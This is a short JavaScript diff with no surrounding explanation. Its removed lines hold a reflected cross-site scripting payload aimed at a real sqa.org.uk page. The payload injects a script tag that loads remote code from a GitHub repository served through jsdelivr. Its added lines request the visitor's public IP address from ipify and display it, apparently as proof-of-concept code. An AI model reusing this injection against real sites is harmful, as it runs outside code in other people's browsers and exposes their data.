@@ -1,6 +1,8 @@
-$.ajax({
- url: 'https://www.sqa.org.uk/sqa/31429.html?secure.error.404.unknown--%3E%3Cscript%20src%3dhttps://cdn.jsdelivr.net/gh/Uexodus/lua-pid@master/a.js%3E%3C%2fscript%3Eazmao=',
- data: 'your image',
- success: function(){window.open("https://www.sqa.org.uk/sqa/31429.html?secure.error.404.unknown--%3E%3Cscript%20src%3dhttps://cdn.jsdelivr.net/gh/Uexodus/lua-pid@master/a.js%3E%3C%2fscript%3Eazmao=");},
- async: false
-}
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://api.ipify.org/", false ); // false for synchronous request
+xmlHttp.send( null );
+alert(xmlHttp.responseText)
+
+
+
+
